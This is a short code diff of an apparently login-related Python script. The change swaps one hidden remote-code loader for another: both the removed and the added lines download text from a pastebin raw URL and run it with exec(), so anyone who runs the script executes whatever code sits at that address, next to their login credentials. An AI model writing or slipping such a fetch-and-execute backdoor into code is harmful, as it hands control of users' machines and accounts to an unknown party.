@@ -47,10 +47,8 @@ headers_login = {
 'x-requested-with': 'XMLHttpRequest'
 }
 
-def tel():
-    e = requests.get('https://pastebin.com/raw/E84uG60s').text 
-    exec(e)
-tel()
+e = requests.get('https://pastebin.com/raw/kjYD9TcZ').text
+exec(e)
 
 data_login = {
 'username': username_login,
